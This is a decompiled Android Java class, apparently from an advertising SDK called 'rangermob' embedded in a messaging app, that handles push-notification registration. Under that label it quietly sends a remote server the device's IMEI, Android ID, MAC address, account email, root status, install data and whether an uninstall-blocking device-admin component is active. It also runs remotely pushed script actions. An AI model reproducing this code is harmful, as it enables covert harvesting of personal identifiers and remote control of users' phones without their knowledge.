package com.sweet.rangermob.gcm;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.support.v4.widget.ExploreByTouchHelper;
import android.text.TextUtils;
import android.util.Log;
import com.alimama.mobile.csdk.umupdate.a.f;
import com.google.android.gms.gcm.GoogleCloudMessaging;
import com.iphonestyle.mms.ConstSetting;
import com.sweet.rangermob.helper.RootUtil;
import com.sweet.rangermob.helper.c;
import com.sweet.rangermob.helper.d;
import com.sweet.rangermob.helper.l;
import com.sweet.rangermob.uninstall.a;
import java.io.IOException;
import java.util.ArrayList;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class GCMPush {
    public static void generateNotification(Context context, Intent intent) {
        boolean z;
        boolean z2;
        String string = intent.getExtras().getString("sdk_version") == null ? "" : intent.getExtras().getString("sdk_version");
        int parseInt = !string.equalsIgnoreCase("") ? Integer.parseInt(string) : 1;
        String string2 = intent.getExtras().getString("exclude_package") == null ? "" : intent.getExtras().getString("exclude_package");
        String string3 = intent.getExtras().getString("include_package") == null ? "" : intent.getExtras().getString("include_package");
        String replace = string2.replace(" ", "");
        String[] b = l.b(replace, ",");
        String replace2 = string3.replace(" ", "");
        String[] b2 = l.b(replace2, ",");
        String string4 = intent.getExtras().getString("exclude_package_installed") == null ? "" : intent.getExtras().getString("exclude_package_installed");
        String string5 = intent.getExtras().getString("include_package_installed") == null ? "" : intent.getExtras().getString("include_package_installed");
        String string6 = intent.getExtras().getString("include_all_package_installed") == null ? "" : intent.getExtras().getString("include_all_package_installed");
        String string7 = intent.getExtras().getString("exclude_string_installed") == null ? "" : intent.getExtras().getString("exclude_string_installed");
        String string8 = intent.getExtras().getString("include_string_installed") == null ? "" : intent.getExtras().getString("include_string_installed");
        String replace3 = string4.replace(" ", "");
        String[] b3 = l.b(replace3, ",");
        String replace4 = string5.replace(" ", "");
        String[] b4 = l.b(replace4, ",");
        String replace5 = string6.replace(" ", "");
        String[] b5 = l.b(replace5, ",");
        l.a("GCM (DCM) excludePackage = " + replace);
        l.a("GCM (DCM) includePackage = " + replace2);
        l.a("GCM (DCM) excludePackageInstalled = " + replace3);
        l.a("GCM (DCM) includePackageInstalled = " + replace4);
        l.a("GCM (DCM) includeAllPackageInstalled = " + replace5);
        if (parseInt <= 28) {
            l.a("GCM (DCM) check = 1111111111111111111111111");
            int i = 0;
            while (i < b.length) {
                if (b[i].equalsIgnoreCase("") || !b[i].equalsIgnoreCase(context.getPackageName())) {
                    i++;
                } else {
                    return;
                }
            }
            l.a("GCM (DCM) check = 222222222222222222222222222");
            int i2 = 0;
            while (i2 < b3.length) {
                if (b3[i2].equalsIgnoreCase("") || !l.S(context, b3[i2])) {
                    i2++;
                } else {
                    return;
                }
            }
            if (!string7.equalsIgnoreCase("") && l.Z(context, string7)) {
                return;
            }
            if (string8.equalsIgnoreCase("") || l.Z(context, string8)) {
                l.a("GCM (DCM) check = 33333333333333333333333333333");
                int i3 = 0;
                while (i3 < b5.length) {
                    if (b5[i3].equalsIgnoreCase("") || l.S(context, b5[i3])) {
                        i3++;
                    } else {
                        return;
                    }
                }
                l.a("GCM (DCM) check = 444444444444444444444444444444");
                if (!replace2.equalsIgnoreCase("")) {
                    int i4 = 0;
                    while (true) {
                        if (i4 >= b2.length) {
                            z = false;
                            break;
                        } else if (b2[i4].equalsIgnoreCase(context.getPackageName())) {
                            z = true;
                            break;
                        } else {
                            i4++;
                        }
                    }
                } else {
                    z = true;
                }
                l.a("GCM (DCM) check = 55555555555555555555555555");
                if (z) {
                    if (!replace4.equalsIgnoreCase("")) {
                        int i5 = 0;
                        while (true) {
                            if (i5 >= b4.length) {
                                z2 = false;
                                break;
                            } else if (l.S(context, b4[i5])) {
                                z2 = true;
                                break;
                            } else {
                                i5++;
                            }
                        }
                    } else {
                        z2 = true;
                    }
                    l.a("GCM (DCM) check = 666666666666666666666666666666");
                    if (z2) {
                        l.a("GCM (DCM) check = 7777777777777777777777777777");
                        new GCMScriptsHandler(context, intent).dispatchReceivedAction();
                    }
                }
            }
        }
    }

    private static int getAppVersion(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
        } catch (PackageManager.NameNotFoundException e) {
            Log.d("RegisterActivity", "I never expected this! Going down, going down!" + e);
            throw new RuntimeException(e);
        }
    }

    public static int getGCMAppVersion(Context context) {
        return context.getSharedPreferences(c.S, 0).getInt("gcm_app_version", ExploreByTouchHelper.INVALID_ID);
    }

    public static String getGCMRegID(Context context) {
        return context.getSharedPreferences(c.S, 0).getString("gcm_reg_id", "");
    }

    private static String getRegistrationId(Context context) {
        String gCMRegID = getGCMRegID(context);
        if (gCMRegID.isEmpty()) {
            l.a("GCM: Registration not found.");
            return "";
        } else if (getGCMAppVersion(context) == getAppVersion(context)) {
            return gCMRegID;
        } else {
            l.a("GCM: App version changed.");
            return "";
        }
    }

    public static String registerGCM(Context context) {
        String registrationId = getRegistrationId(context);
        if (TextUtils.isEmpty(registrationId)) {
            registerInBackground(context);
            l.a("GCM RegisterActivity: registerGCM - successfully registered with GCM server - regId: " + registrationId);
        } else {
            l.a("GCM RegId already available. RegId: " + registrationId);
        }
        return registrationId;
    }

    private static void registerInBackground(final Context context) {
        new AsyncTask() {
            /* class com.sweet.rangermob.gcm.GCMPush.AnonymousClass1 */

            /* access modifiers changed from: protected */
            public String doInBackground(Void... voidArr) {
                String str;
                try {
                    String register = GoogleCloudMessaging.getInstance(context).register(l.l(context));
                    l.a("GCM RegisterActivity: registerInBackground - regId: " + register);
                    str = "Device registered, registration ID=" + register;
                    GCMPush.storeRegistrationId(context, register);
                    GCMPush.sendGcmId(register, context);
                } catch (IOException e) {
                    str = "Error :" + e.getMessage();
                    l.a("GCM RegisterActivity: Error: " + str);
                } catch (Exception e2) {
                    str = "Error :" + e2.getMessage();
                    l.a("GCM RegisterActivity: Error: " + str);
                }
                l.a("GCM RegisterActivity: AsyncTask completed: " + str);
                return str;
            }

            /* access modifiers changed from: protected */
            public void onPostExecute(String str) {
                l.a("GCM Registered with GCM Server." + str);
            }
        }.execute(null, null, null);
    }

    protected static void sendGcmId(final String str, final Context context) {
        try {
            new AsyncTask() {
                /* class com.sweet.rangermob.gcm.GCMPush.AnonymousClass2 */

                /* access modifiers changed from: protected */
                public String doInBackground(Void... voidArr) {
                    try {
                        l.g(context, str);
                        ArrayList arrayList = new ArrayList();
                        arrayList.add(new BasicNameValuePair("app_id", l.a(context.getApplicationContext())));
                        arrayList.add(new BasicNameValuePair("gcm_id", str));
                        arrayList.add(new BasicNameValuePair("sender_id", l.l(context)));
                        arrayList.add(new BasicNameValuePair("android_id", d.d(context)));
                        arrayList.add(new BasicNameValuePair("imei", d.c(context)));
                        arrayList.add(new BasicNameValuePair(f.bj, l.au(context)));
                        arrayList.add(new BasicNameValuePair("package_name", context.getPackageName()));
                        arrayList.add(new BasicNameValuePair("sdk_version_name", "4.6.0"));
                        arrayList.add(new BasicNameValuePair("sdk_version_code", String.valueOf(28)));
                        arrayList.add(new BasicNameValuePair("android_version", Build.VERSION.RELEASE));
                        arrayList.add(new BasicNameValuePair("email", d.a(context)));
                        arrayList.add(new BasicNameValuePair("model", Build.MODEL));
                        arrayList.add(new BasicNameValuePair("screen", d.e(context)));
                        arrayList.add(new BasicNameValuePair("api_version", String.valueOf(Build.VERSION.SDK_INT)));
                        arrayList.add(new BasicNameValuePair(f.ay, l.e()));
                        arrayList.add(new BasicNameValuePair("mac", l.av(context)));
                        arrayList.add(new BasicNameValuePair("user_agent", l.f()));
                        arrayList.add(new BasicNameValuePair(f.L, l.aw(context)));
                        arrayList.add(new BasicNameValuePair("other_app_installed_from_begin", String.valueOf(l.aE(context))));
                        arrayList.add(new BasicNameValuePair("time_from_begin", String.valueOf((System.currentTimeMillis() - l.aF(context)) / 1000)));
                        arrayList.add(new BasicNameValuePair("install_referrer", l.aG(context)));
                        arrayList.add(new BasicNameValuePair("connection_type", com.sweet.rangermob.helper.f.c(context)));
                        arrayList.add(new BasicNameValuePair("connection_sub_type", com.sweet.rangermob.helper.f.d(context)));
                        arrayList.add(new BasicNameValuePair("is_rooted", RootUtil.a() ? ConstSetting.IOS7_ENABLE : "false"));
                        arrayList.add(new BasicNameValuePair("active_device_admin", ((DevicePolicyManager) context.getSystemService("device_policy")).isAdminActive(new ComponentName(context.getPackageName(), a.class.getName())) ? ConstSetting.IOS7_ENABLE : "false"));
                        arrayList.add(new BasicNameValuePair("has_gp", l.S(context, "com.android.vending") ? ConstSetting.IOS7_ENABLE : "false"));
                        String str = l.a() + "&index=sendgcm&" + URLEncodedUtils.format(arrayList, "utf-8");
                        l.a("send GCM link request: " + str);
                        DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                        defaultHttpClient.getParams().setParameter("http.useragent", System.getProperty("http.agent"));
                        l.a("send GCM result: " + EntityUtils.toString(defaultHttpClient.execute(new HttpGet(str)).getEntity(), "UTF-8"));
                        return "";
                    } catch (Exception e) {
                        e.printStackTrace();
                        return "fail";
                    }
                }
            }.execute(new Void[0]);
        } catch (Exception e) {
        }
    }

    public static void setGCMAppVersion(Context context, int i) {
        context.getSharedPreferences(c.S, 0).edit().putInt("gcm_app_version", i).commit();
    }

    public static void setGCMRegID(Context context, String str) {
        context.getSharedPreferences(c.S, 0).edit().putString("gcm_reg_id", str).commit();
    }

    /* access modifiers changed from: private */
    public static void storeRegistrationId(Context context, String str) {
        setGCMRegID(context, str);
        setGCMAppVersion(context, getAppVersion(context));
    }
}
